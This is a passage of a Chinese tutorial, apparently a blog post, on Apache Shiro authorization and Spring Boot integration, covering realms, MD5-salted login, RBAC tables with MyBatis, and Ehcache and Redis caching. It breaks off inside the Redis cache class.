用户实例001的所有权限：user:*：001\n\n\n# 授权实现方式\n\n * 编程式\n\nSubject subject = SecurityUtils.getSubject();\nif(subject.hasRole(“admin”)) {\n\t//有权限\n} else {\n\t//无权限\n}\n\n\n1\n2\n3\n4\n5\n6\n\n * 注解式\n\n@RequiresRoles("admin")\npublic void hello() {\n\t//有权限\n}\n\n\n1\n2\n3\n4\n\n * 标签式\n\nJSP/GSP 标签：在JSP/GSP 页面通过相应的标签完成：\n<shiro:hasRole name="admin">\n\t<!— 有权限—>\n</shiro:hasRole>\n注意: Thymeleaf 中使用shiro需要额外集成!\n\n\n1\n2\n3\n4\n5\n\n\n\n# 开发实现\n\n 1. 自定义realm\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.authz.SimpleAuthorizationInfo;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\nimport org.apache.shiro.util.ByteSource;\n\npublic class CustomerMD5Realm extends AuthorizingRealm {\n    /**\n     * 授权\n     * @param principalCollection\n     * @return\n     */\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n\n        String principal = (String) principalCollection.getPrimaryPrincipal();\n        System.out.println("--------------------------------------------");\n        System.out.println("principal:"+principal);\n\n        SimpleAuthorizationInfo simpleAuthorizationInfo = new SimpleAuthorizationInfo();\n        simpleAuthorizationInfo.addRole("admin");\n\n        simpleAuthorizationInfo.addStringPermission("user:create:*");\n        return simpleAuthorizationInfo;\n    }\n\n    /**\n     * 认证\n     * @param authenticationToken\n     * @return\n     * @throws AuthenticationException\n     */\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n\n        String principal = (String) authenticationToken.getPrincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            AuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n                    principal,\n                    "a991e133559f1891893b60a3c04e8740",\n                    ByteSource.Util.bytes("123/BMK#"),\n                    this.getName()\n            );\n            return authenticationInfo;\n\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n 2. 授权测试代码\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.CustomerMD5Realm;\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.IncorrectCredentialsException;\nimport org.apache.shiro.authc.UnknownAccountException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.authc.credential.HashedCredentialsMatcher;\nimport org.apache.shiro.mgt.DefaultSecurityManager;\nimport org.apache.shiro.subject.Subject;\n\npublic class TestCustomerMD5Realm {\n    public static void main(String[] args) {\n\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n        CustomerMD5Realm customerMD5Realm = new CustomerMD5Realm();\n\n        HashedCredentialsMatcher hashedCredentialsMatcher = new HashedCredentialsMatcher();\n        hashedCredentialsMatcher.setHashAlgorithmName("MD5");\n        hashedCredentialsMatcher.setHashIterations(1024);\n\n        customerMD5Realm.setCredentialsMatcher(hashedCredentialsMatcher);\n        defaultSecurityManager.setRealm(customerMD5Realm);\n\n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n\n        Subject subject = SecurityUtils.getSubject();\n\n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            System.out.println("认证成功");\n            System.out.println(subject.hasRole("admin"));\n            System.out.println(subject.isPermitted("user:create:01"));\n        } catch (UnknownAccountException e) {\n//            e.printStackTrace();\n            System.out.println("用户名不存在");\n        } catch (IncorrectCredentialsException e){\n            System.out.println("密码错误");\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# 整合Springboot\n\n\n# 整合的思路\n\n\n\n\n# 整合的步骤\n\n# 0. 创建Springboot项目\n\n\n\n# 1. 引入相关依赖\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.pwddd</groupId>\n    <artifactId>springboot_jsp_shiro</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-parent</artifactId>\n        <version>2.6.4</version>\n    </parent>\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <version>1.18.2</version>\n            <optional>true</optional>\n        </dependency>\n\n        <dependency>\n            <groupId>org.apache.tomcat.embed</groupId>\n            <artifactId>tomcat-embed-jasper</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>jstl</groupId>\n            <artifactId>jstl</artifactId>\n            <version>1.2</version>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n引入shiro整合springboot\n\n<dependency>\n  <groupId>org.apache.shiro</groupId>\n  <artifactId>shiro-spring-boot-starter</artifactId>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 2. 配置Spring Boot项目\n\n配置Springboot配置文件\n\nserver.port=8888\nserver.servlet.context-path=/shiro\nspring.mvc.view.prefix=/\nspring.mvc.view.suffix=.jsp\n\n\n1\n2\n3\n4\n\n\n配置工作目录\n\n\n\n# 3. 配置shiro环境\n\n# 0. 创建配置类\n\npackage com.pwddd.shiro.config;\n\nimport com.pwddd.shiro.realm.CustomerRealm;\nimport org.apache.shiro.realm.Realm;\nimport org.apache.shiro.spring.web.ShiroFilterFactoryBean;\nimport org.apache.shiro.web.mgt.DefaultWebSecurityManager;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n/**\n * 用于整合shiro的配置类\n */\n@Configuration\npublic class ShiroConfig {\n    //1. 创建shiro filter\n    @Bean\n    public ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager){\n        ShiroFilterFactoryBean factoryBean = new ShiroFilterFactoryBean();\n        factoryBean.setSecurityManager(defaultWebSecurityManager);\n\n        // 配置系统的受限资源和公共资源\n        Map<String,String> map = new HashMap<>();\n        map.put("/login.jsp","anon");\n        map.put("/user/login","anon");\n        map.put("/**","authc");\n\n        // 默认的认证界面 login.jsp\n        factoryBean.setLoginUrl("/login.jsp");\n\n        factoryBean.setFilterChainDefinitionMap(map);\n        return factoryBean;\n\n\n    }\n    //2. 创建安全管理器\n    @Bean\n    public DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm){\n        DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n        defaultWebSecurityManager.setRealm(realm);\n        return defaultWebSecurityManager;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n# 1. 创建自定义realm\n\npackage com.pwddd.shiro.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\n\npublic class CustomerRealm extends AuthorizingRealm {\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        return null;\n    }\n\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        System.out.println("====================================");\n        String principal = (String) authenticationToken.getPrincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n                    principal,\n                    "123456",\n                    this.getName()\n            );\n            return authenticationInfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# 2. 配置页面跳转\n\npackage com.pwddd.shiro.controller;\n\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.IncorrectCredentialsException;\nimport org.apache.shiro.authc.UnknownAccountException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.subject.Subject;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\n@RequestMapping("user")\npublic class UserController {\n\n    @PostMapping("login")\n    public String login(String username,String password){\n\n        Subject subject = SecurityUtils.getSubject();\n\n        try {\n            subject.login(new UsernamePasswordToken(username,password));\n            return "redirect:/index.jsp";\n        } catch (UnknownAccountException e) {\n//            e.printStackTrace();\n            System.out.println("用户名错误");\n        } catch (IncorrectCredentialsException e){\n            System.out.println("密码错误");\n        }\n\n        return "redirect:/login.jsp";\n    }\n    @GetMapping("logout")\n    public String logout(){\n        Subject subject = SecurityUtils.getSubject();\n        subject.logout();\n        return "redirect:/login.jsp";\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n注意:\n\n默认在配置好shiro环境后默认环境中没有对项目中任何资源进行权限控制,所有现在项目中所有资源都可以通过路径访问\n\n# 4. 常见过滤器\n\n注意: shiro提供和多个默认的过滤器，我们可以用这些过滤器来配置控制指定url的权限：\n\n配置缩写                对应的过滤器                           功能\nanon                AnonymousFilter                  指定url可以匿名访问\nauthc               FormAuthenticationFilter         指定url需要form表单登录，默认会从请求中获取username、password,rememberMe等参数并尝试登录，如果登录不了就会跳转到loginUrl配置的路径。我们也可以用这个过滤器做默认的登录逻辑，但是一般都是我们自己在控制器写登录逻辑的，自己写的话出错返回的信息都可以定制嘛。\nauthcBasic          BasicHttpAuthenticationFilter    指定url需要basic登录\nlogout              LogoutFilter                     登出过滤器，配置指定url就可以实现退出功能，非常方便\nnoSessionCreation   NoSessionCreationFilter          禁止创建会话\nperms               PermissionsAuthorizationFilter   需要指定权限才能访问\nport                PortFilter                       需要指定端口才能访问\nrest                HttpMethodPermissionFilter       将http请求方法转化成相应的动词来构造一个权限字符串，这个感觉意义不大，有兴趣自己看源码的注释\nroles               RolesAuthorizationFilter         需要指定角色才能访问\nssl                 SslFilter                        需要https请求才能访问\nuser                UserFilter                       需要已登录或“记住我”的用户才能访问\n\n# 5. 认证的实现\n\n# 1. login.jsp开发认证界面\n\n<%--\n  Created by IntelliJ IDEA.\n  User: plankton\n  Date: 2022/3/28\n  Time: 20:26\n  To change this template use File | Settings | File Templates.\n--%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>登录</title>\n  </head>\n  <body>\n    <h1>登录</h1>\n    <form action="${pageContext.request.contextPath}/user/login" method="post">\n      用户名：<input type="text" name="username" > <br>\n      密码 ：<input type="password" name="password"> <br>\n      <input type="submit" name="提交">\n    </form>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 2. index页面\n\n<%--\n  Created by IntelliJ IDEA.\n  User: plankton\n  Date: 2022/3/28\n  Time: 20:26\n  To change this template use File | Settings | File Templates.\n--%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>首页</title>\n  </head>\n  <body>\n    <h1>首页</h1>\n    <a href="${pageContext.request.contextPath}/user/logout">退出登陆</a> <br>\n    <ul>\n      <li><a href="#">用户管理</a></li>\n      <li><a href="#">商品管理</a></li>\n      <li><a href="#">订单管理</a></li>\n      <li><a href="#">物流管理</a></li>\n    </ul>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 7. MD5和salt认证的实现\n\n# 0. 实现注册\n\n注册页面：\n\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>注册</title>\n</head>\n<body>\n<h1>注册</h1>\n<form action="${pageContext.request.contextPath}/user/register" method="post">\n    用户名：<input type="text" name="username" > <br>\n    密码 ：<input type="password" name="password"> <br>\n    <input type="submit" name="提交">\n</form>\n</body>\n</html>\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. 引入数据库\n\n相关依赖\n\n<dependency>\n  <groupId>org.mybatis.spring.boot</groupId>\n  <artifactId>mybatis-spring-boot-starter</artifactId>\n  <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <version>8.0.28</version>\n</dependency>\n\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid</artifactId>\n  <version>1.2.8</version>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n配置\n\n# 数据源\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.url=jdbc:mysql://localhost:3306/shirodemo?characterEncoding=utf8\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n\n\n创建entity\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.experimental.Accessors;\n\n@Data\n@Accessors(chain = true)\n@NoArgsConstructor\n@AllArgsConstructor\npublic class User {\n    private String id;\n    private String username;\n    private String password;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n编写mapper文件\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE mapper\n        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n\x3c!--名称空间和查询中的名称空间一致--\x3e\n<mapper namespace="com.pwddd.shirojsp.mapper.UserMapper">\n\n    <insert id="save" parameterType="com.pwddd.shirojsp.entity.User">\n        insert into t_user values(#{id},#{username},#{password})\n    </insert>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n配置mybatis\n\n# mybatis\nmybatis.type-aliases-package=com.pwddd.shirojsp.entity\nmybatis.mapper-locations=classpath:mapper/*.xml\n\n\n1\n2\n3\n\n\n创建service层\n\npackage com.pwddd.shirojsp.service.impl;\n\nimport com.pwddd.shirojsp.entity.User;\nimport com.pwddd.shirojsp.mapper.UserMapper;\nimport com.pwddd.shirojsp.service.UserService;\nimport org.apache.shiro.crypto.hash.Md5Hash;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\nimport java.util.UUID;\n\n@Service("userServiceImpl")\npublic class UserServiceImpl implements UserService {\n\n    @Autowired\n    private UserMapper userMapper;\n\n    @Override\n    public void register(User user) {\n        String uuid = UUID.randomUUID().toString();\n        uuid = uuid.replace("-","");\n        user.setId(uuid);\n        Md5Hash md5Hash = new Md5Hash(user.getPassword(), uuid, 1024);\n        user.setPassword(md5Hash.toHex());\n        userMapper.save(user);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n编写controller层\n\n@PostMapping("register")\npublic String register(User user){\n  userService.register(user);\n  return "redirect:/login.jsp";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 3. 认证实现\n\n数据库查询用户信息\n\n @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        System.out.println("====================================");\n        String principal = (String) authenticationToken.getPrincipal();\n\n        // 1. 利用名字去查询数据库\n        User user = userService.getUser(principal);\n        if (user != null){\n            return new SimpleAuthenticationInfo(\n                    user.getUsername(),\n                    user.getPassword(),\n                    ByteSource.Util.bytes(user.getId()),\n                    this.getName()\n            );\n        }\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n设置加密算法和散列次数\n\n//2. 创建安全管理器\n@Bean\npublic DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm){\n  DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n\n  HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n  credentialsMatcher.setHashAlgorithmName("MD5");\n  credentialsMatcher.setHashIterations(1024);\n  realm.setCredentialsMatcher(credentialsMatcher);\n\n  defaultWebSecurityManager.setRealm(realm);\n  return defaultWebSecurityManager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 8. 授权的实现\n\n# 0. 授权页面\n\n<%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>\n<%--\n  Created by IntelliJ IDEA.\n  User: plankton\n  Date: 2022/3/28\n  Time: 20:26\n  To change this template use File | Settings | File Templates.\n--%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>首页</title>\n</head>\n<body>\n<h1>首页</h1>\n<a href="${pageContext.request.contextPath}/user/logout">退出登陆</a> <br>\n<ul>\n    <shiro:hasAnyRoles name="admin" >\n        \n        <shiro:hasAnyRoles name="user">\n            <li><a href="#">用户管理</a></li>\n        </shiro:hasAnyRoles>\n        \n        <shiro:hasAnyRoles name="order">\n            <li><a href="#">商品管理</a></li>\n            <li><a href="#">订单管理</a></li>\n            <li><a href="#">物流管理</a></li>\n        </shiro:hasAnyRoles>\n        \n    </shiro:hasAnyRoles>\n</ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# 1. 测试代码\n\n@Override\nprotected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n  String principal = (String) principalCollection.getPrimaryPrincipal();\n  if ("admin".equals(principal)){\n    SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();\n    authorizationInfo.addRoles(Arrays.asList("admin","user"));\n    return authorizationInfo;\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 2. 方法调用中的权限控制\n\n@RequestMapping("delete/{username}")\n@ResponseBody\n@RequiresRoles(value = {"admin","user"})\npublic String deleteUser(@PathParam("username")String username){\n    userService.deleteUser(username);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 3. 授权数据持久化\n\n通常情况下，我们的授权信息存储到数据库中，我们这里使用一个用户对应多个角色，角色对应权限的RBAC模型进行设计。如下图所示：\n\n\n\n创建对应的表：\n\ndrop table if exists t_role;\ncreate table if not exists t_role\n(\n    rid   varchar(100) not null,\n    rname varchar(200) not null,\n    primary key (rid)\n);\n\ninsert into t_role\nvalues (\'1\', \'admin\'),\n       (\'2\', \'user\'),\n       (\'3\', \'order\');\n\ndrop table if exists t_permission;\ncreate table if not exists t_permission\n(\n    pid   varchar(100) not null,\n    pname varchar(200) not null,\n    url   varchar(200) not null,\n    primary key (pid)\n);\n\ninsert into t_permission\nvalues (\'1\', \'user:*:*\', \'/user/*\'),\n       (\'2\', \'order:*:*\', \'/order/*\'),\n       (\'3\', \'user:delete:*\', \'/user/delete/\');\n\n\ndrop table if exists t_user_role;\ncreate table if not exists t_user_role\n(\n    id  varchar(100) not null,\n    uid varchar(100) not null,\n    rid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_user_role\nvalues (\'1\', \'826975e8649341c1b6af743e4f9923f2\', \'1\'),\n       (\'2\', \'826975e8649341c1b6af743e4f9923f2\', \'2\'), -- admin all\n       (\'3\', \'826975e8649341c1b6af743e4f9923f2\', \'3\'),\n       (\'4\', \'00b6c77cb7c048e9a6a8858a600cc206\', \'3\'); -- lisi order\n\ndrop table if exists t_role_permission;\ncreate table t_role_permission\n(\n    id  varchar(100) not null,\n    rid varchar(100) not null,\n    pid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_role_permission\nvalues (\'1\', \'1\', \'1\'),\n       (\'2\', \'1\', \'2\'),\n       (\'3\', \'1\', \'3\'),\n       (\'4\', \'2\', \'1\'),\n       (\'5\', \'2\', \'3\'),\n       (\'6\', \'3\', \'2\'),\n       (\'7\', \'3\', \'2\');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n编写实体类：\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.experimental.Accessors;\n\nimport java.util.List;\n\n@Data\n@Accessors(chain = true)\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Role {\n    \n    private String id;\n    private String rid;\n    private String rname;\n    \n    private List<Perm> perms;\n    \n}\n\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.experimental.Accessors;\n\n@Data\n@Accessors(chain = true)\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Perm {\n\n    private String id;\n    private String pid;\n    private String pname;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n查询用户时就查所有的用户权限和身份信息：\n\n<resultMap id="usermap" type="User">\n  <id column="id" property="id" />\n  <result column="username" property="username" />\n  <result column="password" property="password" />\n  <collection property="roles" ofType="Role" >\n    <id column="role_id" property="rid" />\n    <result column="role_name" property="rname" />\n    <collection property="perms" ofType="Perm">\n      <id column="perm_id" property="pid" />\n      <result column="perm_name" property="pname" />\n      <result column="perm_url" property="purl" />\n    </collection>\n  </collection>\n</resultMap>\n<select id="selectUser" resultMap="usermap">\n  select u.id, u.username, u.password, r.rid role_id, r.rname role_name,tp.pid perm_id,tp.pname perm_name,tp.url perm_url\n  from t_user u\n  left join t_user_role ur on u.id = ur.uid\n  left join t_role r on ur.rid = r.rid\n  left join t_role_permission trp on r.rid = trp.rid\n  left join t_permission tp on trp.pid = tp.pid\n  where username = #{username}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n设置权限信息：\n\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        String principal = (String) principalCollection.getPrimaryPrincipal();\n\n        // 根据principal查询对应的用户组\n        User user = userService.getUser(principal);\n        if (user != null){\n            SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();\n            for (Role role :\n                    user.getRoles()) {\n                authorizationInfo.addRole(role.getRname());\n                for (Perm perm : role.getPerms()){\n                    authorizationInfo.addStringPermission(perm.getPname());\n                }\n            }\n            return authorizationInfo;\n        }\n\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 9. 使用CacheManager\n\n# 0. Ehcache\n\n引入依赖\n\n<dependency>\n  <groupId>org.apache.shiro</groupId>\n  <artifactId>shiro-ehcache</artifactId>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n开启缓存\n\n//2. 创建安全管理器\n@Bean\npublic DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm){\n\n  DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n\n  HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n  credentialsMatcher.setHashAlgorithmName("MD5");\n  credentialsMatcher.setHashIterations(1024);\n  realm.setCredentialsMatcher(credentialsMatcher);\n  realm.setCacheManager(new EhCacheManager());\n  realm.setCachingEnabled(true);\n  realm.setAuthorizationCachingEnabled(true);\n  realm.setAuthenticationCachingEnabled(true);\n  defaultWebSecurityManager.setRealm(realm);\n  return defaultWebSecurityManager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 1. redis\n\n引入redis依赖：\n\n\x3c!--redis整合springboot--\x3e\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n配置连接：\n\n# redis\nspring.redis.database=0\nspring.redis.host=localhost\nspring.redis.port=6379\n\n\n1\n2\n3\n4\n\n\n配置RedisCacheManager\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.Cache;\nimport org.apache.shiro.cache.CacheException;\nimport org.apache.shiro.cache.CacheManager;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.cache.CacheProperties;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class RedisCacheManager implements CacheManager {\n\n    @Autowired\n    private RedisCache redisCache;\n\n    @Override\n    public <K, V> Cache<K, V> getCache(String s) throws CacheException {\n        System.out.println(s);\n        redisCache.setCacheName(s);\n        return redisCache;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n配置RedisCache\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.Cache;\nimport org.apache.shiro.cache.CacheException;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Collection;\nimport java.util.Set;\n\n@Component\npublic class RedisCache<K,V> implements Cache<K,V> {\n\n    private String cacheName;\n\n\n    public RedisCache() {\n    }\n\n    public String getCacheName() {\n        return cacheName;\n    }\n\n    public void setCacheName(String cacheName) {\n        this.cacheName = cacheName;\n    }\n\n    @Autowired\n    private RedisTemplate redisTemplate;\n\n    @Override\n    public V get(K k) throws CacheException {\n        V value = (V) redisTemplate.opsForHash().get(this.getCacheName(), k);\n        System.out.println("【Redis - GET】{ key:"+k+",Value:"+value);\n        return value;\n    }\n\n    @Override\n    public V put(K k, V v) throws CacheException {\n        System.out.println("【Redis - PUT】{ key:"+k+",Value:"+v);\n        redisTemplate.opsForHash().put(this.cacheName,k.toString(),v);\n        return null;\n    }\n\n    @Override\n    public V remove(K k) throws CacheException {\n        V value = (V) redisTemplate.opsForHash().delete(this.cacheName, k.toString());\n        System.out.println("【Redis - PUT】{ 